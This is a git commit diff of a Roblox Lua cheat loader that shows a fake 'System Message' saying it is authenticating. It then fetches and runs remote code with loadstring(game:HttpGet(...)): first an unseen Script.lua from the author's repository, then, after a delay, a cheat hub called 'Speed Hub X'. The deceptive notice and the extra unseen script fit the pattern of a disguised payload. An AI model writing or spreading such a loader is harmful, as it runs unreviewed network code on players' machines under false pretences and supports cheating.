5eea61ccb334215b5d67e7167314fe4b41f84c5e
Updates-Script <cutenies123@gmail.com>
2025-08-11 19:05:34 +0800

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,16 +1,13 @@
--- Notification right away
+-- Notification
 game.StarterGui:SetCore("SendNotification", {
     Title = "System Message",
     Text = "🔒 Authenticating... Please stand by.",
     Duration = 3
 })
 
--- Second script right away
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()
-end)
+-- Second script immediately
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()
 
--- Wait 4 seconds, then load Speed Hub X
-task.delay(4, function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-end)
+-- Wait 4 seconds, then Speed Hub X
+wait(4)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
